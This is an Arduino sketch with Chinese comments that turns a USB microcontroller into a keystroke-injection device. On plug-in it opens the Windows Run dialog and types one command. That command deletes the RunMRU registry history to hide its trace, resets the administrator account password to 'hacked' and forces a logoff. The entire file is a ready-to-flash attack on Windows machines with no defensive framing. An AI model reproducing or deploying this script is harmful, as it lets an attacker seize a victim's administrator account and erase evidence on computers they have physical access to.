void setup() {//初始化
  Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(500); 
  Keyboard.println("cmd.exe /c reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f&net user administrator hacked&shutdown -l -f");
  Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{
}
